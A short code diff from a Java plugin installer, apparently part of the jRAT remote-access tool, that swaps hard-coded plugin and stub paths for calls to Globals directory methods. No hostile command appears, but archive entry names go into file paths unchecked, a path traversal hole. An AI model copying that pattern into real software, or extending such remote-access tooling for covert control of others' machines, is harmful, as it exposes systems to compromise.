@@ -1,6 +1,7 @@
 package io.jrat.client.extensions;
 
 import io.jrat.client.Constants;
+import io.jrat.client.Globals;
 import io.jrat.client.Main;
 import io.jrat.client.UniqueId;
 import io.jrat.client.exceptions.MissingKeyException;
@@ -114,14 +115,14 @@ public class ExtensionInstaller {
 			File output;
 
 			if (entry.getName().startsWith("stubs/") && entry.getName().toLowerCase().endsWith(".jar")) {
-				output = new File("plugins/stubs/" + plugin.getName() + " " + entry.getName().substring(6, entry.getName().length()));
+				output = new File(Globals.getPluginStubDirectory(), plugin.getName() + " " + entry.getName().substring(6, entry.getName().length()));
 			} else if (entry.getName().startsWith("root/")) {
 				output = new File("plugins/" + entry.getName().substring(5, entry.getName().length()));
 				if (!entry.getName().equals("root/")) {
 					mainJars.add(output);
 				}
 			} else {
-				output = new File("plugins/" + plugin.getName() + "/" + entry.getName());
+				output = new File(Globals.getPluginDirectory(), plugin.getName() + "/" + entry.getName());
 			}
 
 			if (output.isDirectory()) {
